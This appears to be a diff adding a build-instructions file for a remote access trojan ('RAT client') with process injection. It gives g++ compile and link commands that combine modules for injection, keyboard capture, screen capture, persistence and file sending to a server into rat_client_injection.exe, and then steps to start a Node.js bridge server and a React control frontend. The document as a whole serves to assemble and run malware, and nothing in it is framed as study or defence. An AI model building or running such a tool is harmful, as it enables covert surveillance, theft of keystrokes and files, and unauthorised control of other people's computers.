@@ -1,0 +1,50 @@
+# COMPILATION COMMANDS FOR PROCESS INJECTION BACKEND
+
+## 1. COMPILE ENHANCED PROCESS UTILITIES
+cd "c:\Users\Administrator\Desktop\CLI C+ Root\rootserver"
+g++ -c process_utils.cpp -o process_utils.o -I. -lpsapi -ladvapi32
+
+## 2. COMPILE ENHANCED INJECTION (when you create injection_methods.cpp)
+cd "c:\Users\Administrator\Desktop\CLI C+ Root\rootserver"
+g++ -c injection_methods.cpp -o injection_methods.o -I.
+
+## 3. COMPILE MAIN RAT CLIENT WITH NEW FEATURES
+cd "c:\Users\Administrator\Desktop\CLI C+ Root\rootserver"
+g++ -c main.cpp -o main_new.o -I. -lws2_32
+
+## 4. LINK EVERYTHING TOGETHER
+cd "c:\Users\Administrator\Desktop\CLI C+ Root\rootserver"
+g++ main_new.o process_utils.o injection.o utils.o exec_command.o screen_capture.o keyboard.o persistence.o send_file.o send_to_server.o -o rat_client_injection.exe -lws2_32 -lpsapi -ladvapi32
+
+## 5. OR USE EXISTING COMPILE SCRIPT
+cd "c:\Users\Administrator\Desktop\CLI C+ Root\rootserver"
+compile.bat
+
+## 6. START BRIDGE SERVER (Node.js)
+cd "c:\Users\Administrator\Desktop\CLI C+ Root"
+node bridge/index.js
+
+## 7. TEST INTEGRATION (requires ws module installed)
+cd "c:\Users\Administrator\Desktop\CLI C+ Root"
+npm install ws
+node test_injection_integration.js
+
+## 8. START FRONTEND (React/Vite)
+cd "c:\Users\Administrator\Desktop\CLI C+ Root\Client\frontend"
+npm run dev
+
+## QUICK TEST COMMANDS:
+
+# Test process utilities standalone:
+cd "c:\Users\Administrator\Desktop\CLI C+ Root\rootserver"
+g++ process_utils.cpp -o test_process.exe -lpsapi -ladvapi32
+test_process.exe
+
+# Test injection standalone:
+cd "c:\Users\Administrator\Desktop\CLI C+ Root\rootserver"
+g++ injection.cpp -o test_inject.exe
+test_inject.exe
+
+## DEPENDENCIES INSTALLATION:
+npm install ws sqlite3 uuid
+npm install -g nodemon (optional for auto-restart)
